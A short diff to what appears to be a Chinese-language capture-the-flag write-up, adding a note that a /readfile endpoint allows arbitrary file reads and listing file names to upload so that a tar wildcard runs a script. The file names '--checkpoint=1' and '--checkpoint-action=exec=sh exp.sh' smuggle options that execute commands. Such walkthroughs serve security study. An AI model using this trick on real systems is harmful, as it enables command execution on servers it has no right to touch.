@@ -15,7 +15,10 @@ chmod +x main
 ```
 
 利用：
-通过Web上传三个文件，文件名为：
+
+通过/readfile?file=xx可以任意文件读取，但无法读取根目录下的flag
+
+通过Web接口上传三个文件，文件名为：
 ```
 --checkpoint=1
 --checkpoint-action=exec=sh exp.sh
